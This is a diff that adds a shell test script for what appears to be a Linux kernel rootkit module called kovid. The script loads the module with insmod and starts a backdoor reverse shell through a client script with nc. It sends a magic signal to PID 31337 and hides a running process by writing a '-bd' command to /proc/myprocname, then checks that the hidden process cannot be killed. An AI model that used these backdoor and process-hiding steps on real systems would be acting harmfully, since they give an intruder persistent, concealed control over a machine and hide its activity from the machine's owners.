@@ -1,0 +1,35 @@
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+sudo insmod ../../../build/kovid.ko
+
+# Start the reverse shell in the background, suppressing its output
+sudo timeout 20 ../../../scripts/bdclient.sh nc localhost 9999 > /dev/null 2>&1 &
+
+# Allow the reverse shell to initialize
+sleep 1
+
+# Send a signal to the "kill -CONT 31337" process as an additional check
+kill -CONT 31337 || echo "sh: can't kill pid 31337: No such process"
+
+# Run the `a.out` executable in the background and capture its PID
+./Inputs/a.out &
+AOUT_PID=$!
+
+# Wait briefly to ensure the process has started
+sleep 1
+
+# Hide the process using the backdoor functionality
+echo -bd $AOUT_PID > /proc/myprocname
+
+# Attempt to kill the hidden process and verify that it fails
+kill -9 "$AOUT_PID" || echo "sh: can't kill pid $AOUT_PID: No such process"
+
+# Remove the module
+sudo rmmod kovid
+
+# CHECK: sh: can't kill pid 31337: No such process
+# CHECK: sh: can't kill pid {{.*}}: No such process
